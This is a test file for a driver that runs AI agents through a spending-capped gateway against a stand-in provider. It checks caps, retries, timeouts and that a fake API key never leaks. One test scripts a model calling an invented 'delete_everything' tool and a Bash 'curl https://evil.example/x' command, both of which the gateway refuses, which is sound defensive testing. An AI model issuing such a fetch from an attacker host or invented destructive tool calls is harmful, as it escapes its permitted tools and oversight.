// Register row DK1801: the model driver of the society cohort, against a stand-in provider (no key, no network): the loop through a per-agent gateway, the society's tools as `mcp__society__<name>`, the dollar and
// turn and wall-clock limits, the bounded retry of 429 and 529, a clean stop, and the key that is never written anywhere. Fake key, fake agents, a toy tool set.
import { after, test } from "node:test";
import assert from "node:assert/strict";
import { createServer, type Server, type IncomingMessage, type ServerResponse } from "node:http";
import { existsSync, mkdtempSync, readdirSync, readFileSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { runCohort, retryWaitMs, gatewayStopReason, type DriverEvent, type SocietyToolSet } from "../src/index.ts";

const servers: Server[] = [];
after(() => { for (const s of servers) s.close(); });
const FAKE_KEY = "sk-ant-FAKE-cohort-key-0123456789abcdef";
const instant = () => Promise.resolve();

type Req = { body: any; headers: IncomingMessage["headers"]; n: number };
async function provider(handler: (r: Req, res: ServerResponse) => void | Promise<void>) {
  let n = 0; const seen: Req[] = [];
  const s = createServer((req, res) => { const chunks: Buffer[] = []; req.on("data", (c) => chunks.push(c)); req.on("end", async () => { const r: Req = { body: ((b: any) => { if (Array.isArray(b.system)) b.system = b.system.map((x: { text?: string }) => x.text ?? "").join(""); return b; })(JSON.parse(Buffer.concat(chunks).toString("utf8") || "{}")), headers: req.headers, n: ++n }; seen.push(r); await handler(r, res); }); });
  await new Promise<void>((r) => s.listen(0, "127.0.0.1", r)); servers.push(s);
  return { url: `http://127.0.0.1:${(s.address() as { port: number }).port}`, seen };
}
const reply = (res: ServerResponse, content: unknown[], usage = { input_tokens: 1000, output_tokens: 100 }) => {
  res.writeHead(200, { "content-type": "application/json" });
  res.end(JSON.stringify({ id: "m", type: "message", role: "assistant", model: "claude-haiku-5-5", stop_reason: content.some((b: any) => b.type === "tool_use") ? "tool_use" : "end_turn", usage, content }));
};
const tu = (id: string, name: string, input: Record<string, unknown>) => ({ type: "tool_use", id, name, input });
const lastResult = (r: Req) => { const m = r.body.messages.at(-1); return Array.isArray(m?.content) ? (m.content as any[]).filter((b) => b.type === "tool_result") : []; };

function toolset(calls: { agent: string; tool: string; args: unknown }[] = [], over: Partial<Record<string, (args: any) => Promise<{ ok: boolean; text: string }>>> = {}): SocietyToolSet {
  return {
    tools: [
      { name: "look", description: "See where you are.", input_schema: { type: "object", properties: {} }, run: async (a, c) => { calls.push({ agent: c.agent, tool: "look", args: a }); return over.look ? over.look(a) : { ok: true, text: "a quiet square with a notice board" }; } },
      { name: "post", description: "Write on the notice board.", input_schema: { type: "object", properties: { text: { type: "string" } }, required: ["text"] }, run: async (a, c) => { calls.push({ agent: c.agent, tool: "post", args: a }); return over.post ? over.post(a) : { ok: true, text: "posted" }; } },
    ],
    system: (agent) => `You are ${agent}, a citizen. No goal is given.`,
    opening: () => "You arrive.",
  };
}
const dirs = () => mkdtempSync(join(tmpdir(), "cohort-"));
/** The standard script: look, then post, then say a word and stop. */
const script = (r: Req, res: ServerResponse) => {
  const step = r.body.messages.filter((m: any) => m.role === "assistant").length;
  if (step === 0) return reply(res, [{ type: "text", text: "Let me look." }, tu("t1", "mcp__society__look", {})]);
  if (step === 1) return reply(res, [tu("t2", "mcp__society__post", { text: "hello from " + /You are (\S+),/.exec(r.body.system)?.[1] })]);
  return reply(res, [{ type: "text", text: "That is enough for today." }]);
};
const base = (up: string, over: Record<string, unknown> = {}) => ({ model: "claude-haiku-5-5", keyEnv: "COHORT_TEST_KEY", env: { COHORT_TEST_KEY: FAKE_KEY }, perAgentUsd: 0.4, totalUsd: 6, runDir: dirs(), upstream: up, sleep: instant, ...over });

test("a cohort of three agents runs the loop through their gateways: tools called with the model's arguments, the cost from real usage, run logs kept, and the provider key reaches only the provider", async () => {
  const p = await provider(script);
  const calls: { agent: string; tool: string; args: unknown }[] = [];
  const events: DriverEvent[] = [];
  const o = base(p.url);
  const res = await runCohort({ ...o, agents: ["did:web:x:agents:ada", "did:web:x:agents:bo", "did:web:x:agents:cy"], toolsetFor: () => toolset(calls), signal: new AbortController().signal, onEvent: (e) => events.push(e) });
  assert.equal(res.outcomes.length, 3);
  for (const out of res.outcomes) {
    assert.equal(out.stopped, "finished", JSON.stringify(out));
    assert.equal(out.turns, 3);
    assert.equal(out.toolCalls, 2);
    assert.equal(out.refused, 0);
    assert.deepEqual(out.tokens, { input: 3000, output: 300 });
    assert.ok(Math.abs(out.usd - 3 * (1000 * 1.5 + 100 * 7.5) / 1e6) < 1e-9, `usd ${out.usd}`);
    assert.ok(out.runLog && existsSync(out.runLog));
  }
  assert.ok(Math.abs(res.usd - 9 * 0.00225) < 1e-6);
  assert.equal(res.stopped, "finished");
  assert.equal(calls.filter((c) => c.tool === "post").length, 3);
  assert.deepEqual(calls.filter((c) => c.agent.endsWith(":bo") && c.tool === "post").map((c) => c.args), [{ text: "hello from did:web:x:agents:bo" }]);
  assert.ok(events.some((e) => e.kind === "turn") && events.some((e) => e.kind === "tool" && e.ok) && events.filter((e) => e.kind === "end").length === 3);
  assert.ok(p.seen.every((r) => r.headers["x-api-key"] === FAKE_KEY), "the gateway put the key on the request to the provider");
  assert.ok(p.seen.every((r) => r.body.tools.every((t: any) => t.name.startsWith("mcp__society__"))));
  // the key is nowhere under the run folder, nor in the outcomes or the events
  const walk = (d: string): string[] => readdirSync(d).flatMap((n) => { const f = join(d, n); return statSync(f).isDirectory() ? walk(f) : [f]; });
  for (const f of walk(o.runDir)) assert.ok(!readFileSync(f, "utf8").includes(FAKE_KEY), `the key is in ${f}`);
  assert.ok(!JSON.stringify([res, events]).includes(FAKE_KEY));
});

test("a tool the model invents is refused by the gateway before it reaches the society, the loop tells the model, and the run goes on", async () => {
  const p = await provider((r, res) => {
    const step = r.body.messages.filter((m: any) => m.role === "assistant").length;
    if (step === 0) return reply(res, [tu("t1", "mcp__society__delete_everything", { all: true })]);
    if (step === 1) return reply(res, [tu("t2", "Bash", { command: "curl https://evil.example/x" })]);
    return reply(res, [{ type: "text", text: "ok, I will stop" }]);
  });
  const calls: { agent: string; tool: string; args: unknown }[] = [];
  const res = await runCohort({ ...base(p.url), agents: ["a"], toolsetFor: () => toolset(calls), signal: new AbortController().signal });
  const out = res.outcomes[0];
  assert.equal(out.stopped, "finished", JSON.stringify(out));
  assert.equal(out.refused, 2, "an invented tool and a shell call are both refused");
  assert.equal(out.toolCalls, 0, "nothing reached a tool");
  assert.deepEqual(calls, []);
  assert.ok(p.seen[1].body.messages.at(-1).content.includes("not run"), "the model is told its call was not run");
});

test("the agent's dollar cap stops it before the call that could pass it, with the reason named and the spend from the gateway", async () => {
  const p = await provider((_r, res) => reply(res, [tu("t" + Math.random(), "mcp__society__look", { n: Math.random() })]));
  const res = await runCohort({ ...base(p.url), perAgentUsd: 0.01, agents: ["a"], toolsetFor: () => toolset(), signal: new AbortController().signal });
  const out = res.outcomes[0];
  assert.equal(out.stopped, "usd_cap", JSON.stringify(out));
  assert.equal(p.seen.length, 1, "the second call was refused before it was made");
  assert.ok(out.usd > 0 && out.usd <= 0.01);
  assert.match(out.detail ?? "", /ASP gateway/);
});

test("the cohort's total cap stops every agent, and the stop says it was the total", async () => {
  const p = await provider((_r, res) => reply(res, [tu("t" + Math.random(), "mcp__society__look", { n: Math.random() })]));
  const res = await runCohort({ ...base(p.url), totalUsd: 0.004, agents: ["a", "b", "c"], parallel: 3, toolsetFor: () => toolset(), signal: new AbortController().signal });
  assert.equal(res.stopped, "the cohort's total of $0.00 was reached".replace("$0.00", "$0.00"));
  assert.ok(res.outcomes.every((o) => o.stopped === "usd_cap"), JSON.stringify(res.outcomes.map((o) => o.stopped)));
  assert.ok(res.usd >= 0.004);
});

test("a 429 and a 529 from the provider are retried with a bounded wait and the run goes on; a provider that never recovers ends the agent with provider_error after four retries", async () => {
  let k = 0;
  const p = await provider((r, res) => {
    k++;
    if (k === 1) { res.writeHead(429, { "content-type": "application/json", "retry-after": "3" }); return void res.end(JSON.stringify({ type: "error", error: { type: "rate_limit_error", message: "slow down" } })); }
    if (k === 2) { res.writeHead(529, { "content-type": "application/json" }); return void res.end(JSON.stringify({ type: "error", error: { type: "overloaded_error", message: "Overloaded" } })); }
    return script(r, res);
  });
  const events: DriverEvent[] = [];
  const waits: number[] = [];
  const res = await runCohort({ ...base(p.url), agents: ["a"], toolsetFor: () => toolset(), signal: new AbortController().signal, onEvent: (e) => events.push(e), sleep: (ms) => { waits.push(ms); return Promise.resolve(); } });
  assert.equal(res.outcomes[0].stopped, "finished");
  assert.deepEqual(events.filter((e) => e.kind === "retry").map((e: any) => [e.status, e.attempt]), [[429, 1], [529, 2]]);
  assert.deepEqual(waits, [2000, 4000], "2 then 4 seconds: the gateway does not forward the provider's retry-after, so the driver's own steps are used");
  const dead = await provider((_r, res) => { res.writeHead(529, { "content-type": "application/json" }); res.end(JSON.stringify({ type: "error", error: { type: "overloaded_error", message: "Overloaded" } })); });
  const r2 = await runCohort({ ...base(dead.url), agents: ["a"], toolsetFor: () => toolset(), signal: new AbortController().signal });
  assert.equal(r2.outcomes[0].stopped, "provider_error");
  assert.equal(dead.seen.length, 5, "one call and four retries, no more");
  assert.match(r2.outcomes[0].detail ?? "", /HTTP 529/);
});

test("the retry waits and the gateway's own wording are read exactly", () => {
  assert.equal(retryWaitMs(1, null), 2000); assert.equal(retryWaitMs(2, null), 4000); assert.equal(retryWaitMs(3, null), 8000); assert.equal(retryWaitMs(4, null), 16000);
  assert.equal(retryWaitMs(1, "7"), 7000); assert.equal(retryWaitMs(1, "0"), 0); assert.equal(retryWaitMs(1, "500"), 60000, "never more than a minute"); assert.equal(retryWaitMs(1, "nonsense"), 2000);
  assert.equal(gatewayStopReason("ASP gateway: the next model call is refused: the estimated spend of this run is $0.01 of its $0.01 cap"), "usd_cap");
  assert.equal(gatewayStopReason("ASP gateway: the next model call is refused: this run has used 100 of its 100 tokens"), "token_cap");
  assert.equal(gatewayStopReason("ASP gateway: this run was stopped (the contract has ended)"), "gateway_stopped");
  assert.equal(gatewayStopReason("Overloaded"), undefined, "the provider's own words are never a gateway stop");
});

test("the turn limit, the wall clock and an abort each stop the loop with their own reason", async () => {
  const p = await provider((_r, res) => reply(res, [tu("t" + Math.random(), "mcp__society__look", { n: Math.random() })]));
  const turns = await runCohort({ ...base(p.url), limits: { maxTurns: 2 }, agents: ["a"], toolsetFor: () => toolset(), signal: new AbortController().signal });
  assert.equal(turns.outcomes[0].stopped, "max_turns");
  assert.equal(turns.outcomes[0].turns, 2);
  const slow = await provider(async (r, res) => { await new Promise((x) => setTimeout(x, 400)); script(r, res); });
  const wall = await runCohort({ ...base(slow.url), limits: { wallClockMs: 150 }, agents: ["a"], toolsetFor: () => toolset(), signal: new AbortController().signal });
  assert.equal(wall.outcomes[0].stopped, "wall_clock");
  const ac = new AbortController();
  const first = await provider((r, res) => { ac.abort(); script(r, res); });
  const t0 = Date.now();
  const stopped = await runCohort({ ...base(first.url), agents: ["a", "b"], toolsetFor: () => toolset(), signal: ac.signal });
  assert.ok(stopped.outcomes.every((o) => o.stopped === "stopped"), JSON.stringify(stopped.outcomes.map((o) => o.stopped)));
  assert.equal(stopped.stopped, "stopped");
  assert.ok(Date.now() - t0 < 5000, "the stop is quick");
});

test("a tool that never answers is timed out, an overlong result is cut, and a tool that throws is told to the model as an error", async () => {
  const seenResults: string[] = [];
  const p = await provider((r, res) => {
    const step = r.body.messages.filter((m: any) => m.role === "assistant").length;
    for (const b of lastResult(r)) seenResults.push(String(b.content) + (b.is_error ? " [error]" : ""));
    if (step === 0) return reply(res, [tu("t1", "mcp__society__look", {})]);
    if (step === 1) return reply(res, [tu("t2", "mcp__society__post", { text: "x" })]);
    if (step === 2) return reply(res, [tu("t3", "mcp__society__look", { again: true })]);
    return reply(res, [{ type: "text", text: "done" }]);
  });
  let n = 0;
  const ts = toolset([], {
    look: async () => (++n === 1 ? new Promise(() => undefined) : { ok: true, text: "y".repeat(100) }),
    post: async () => { throw new Error("the society is closed"); },
  });
  const res = await runCohort({ ...base(p.url), toolTimeoutMs: 100, limits: { maxResultChars: 60 }, agents: ["a"], toolsetFor: () => ts, signal: new AbortController().signal });
  assert.equal(res.outcomes[0].stopped, "finished", JSON.stringify(res.outcomes[0]));
  assert.equal(seenResults[0], "the tool timed out [error]");
  assert.equal(seenResults[1], "the tool failed: the society is closed [error]");
  assert.equal(seenResults[2], "y".repeat(60) + "\n[cut: 40 more characters]");
});

test("the key is read only from the named variable: a missing one is an error that names the variable and never a key, and nothing starts", async () => {
  const p = await provider(script);
  await assert.rejects(() => runCohort({ ...base(p.url, { env: {} }), agents: ["a"], toolsetFor: () => toolset(), signal: new AbortController().signal }), (e: Error) => /COHORT_TEST_KEY is not set/.test(e.message) && !/sk-ant/.test(e.message));
  assert.equal(p.seen.length, 0);
  await assert.rejects(() => runCohort({ ...base(p.url), perAgentUsd: 0, agents: ["a"], toolsetFor: () => toolset(), signal: new AbortController().signal }), /must be positive/);
});

// Direct tests of the loop with a scripted fetch (no gateway): the edges the gateway makes unreachable or slow to reach.
import { runAgent } from "../src/index.ts";
const scripted = (replies: unknown[]): typeof fetch => { let i = 0; return (async () => new Response(JSON.stringify(replies[Math.min(i++, replies.length - 1)]), { status: 200, headers: { "content-type": "application/json" } })) as typeof fetch; };
const msg = (content: unknown[]) => ({ content, stop_reason: content.some((b: any) => b.type === "tool_use") ? "tool_use" : "end_turn" });

test("a result of exactly the limit is not cut and one character more is; a name that is not in the tool set is answered as an error and never run; the refusals the gateway counted are in the outcome", async () => {
  const seen: string[] = [];
  const fetchImpl: typeof fetch = (async (_u: unknown, init?: RequestInit) => {
    const b = JSON.parse(String(init?.body)); const step = b.messages.filter((m: any) => m.role === "assistant").length;
    for (const r of (Array.isArray(b.messages.at(-1)?.content) ? b.messages.at(-1).content : []) as any[]) if (r.type === "tool_result") seen.push(String(r.content) + (r.is_error ? " [error]" : ""));
    const out = step === 0 ? msg([tu("a", "mcp__society__look", { n: 1 })]) : step === 1 ? msg([tu("b", "mcp__society__look", { n: 2 })]) : step === 2 ? msg([tu("c", "mcp__society__ghost", {})]) : msg([{ type: "text", text: "done" }]);
    return new Response(JSON.stringify(out), { status: 200, headers: { "content-type": "application/json" } });
  }) as typeof fetch;
  let n = 0;
  const ts = toolset([], { look: async () => ({ ok: true, text: ++n === 1 ? "z".repeat(10) : "z".repeat(11) }) });
  const out = await runAgent({ agent: "a", toolset: ts, model: "m", gatewayUrl: "http://x", signal: new AbortController().signal, fetchImpl, limits: { maxResultChars: 10 }, observe: () => ({ spendUsd: 0.5, tokens: { input: 1, output: 2 }, refused: 3 }) });
  assert.equal(seen[0], "z".repeat(10), "exactly the limit: not cut");
  assert.equal(seen[1], "z".repeat(10) + "\n[cut: 1 more characters]", "one more: cut");
  assert.equal(seen[2], "there is n\n[cut: 32 more characters] [error]", "an unknown name is answered as an error (cut like any result), not run");
  assert.equal(out.stopped, "finished");
  assert.equal(out.refused, 3, "the gateway's own count is used when it is higher than what the loop saw");
  assert.deepEqual([out.usd, out.tokens], [0.5, { input: 1, output: 2 }]);
});

test("a tool that takes 3.5 seconds is not cut off by the default 30-second limit", async () => {
  const fetchImpl = scripted([msg([tu("a", "mcp__society__look", {})]), msg([{ type: "text", text: "ok" }])]);
  const ts = toolset([], { look: () => new Promise((r) => setTimeout(() => r({ ok: true, text: "slow but done" }), 3500)) });
  const seen: DriverEvent[] = [];
  const out = await runAgent({ agent: "a", toolset: ts, model: "m", gatewayUrl: "http://x", signal: new AbortController().signal, fetchImpl, onEvent: (e) => seen.push(e) });
  assert.equal(out.stopped, "finished");
  assert.ok(seen.some((e) => e.kind === "tool" && e.ok), "the slow tool's result was used");
});
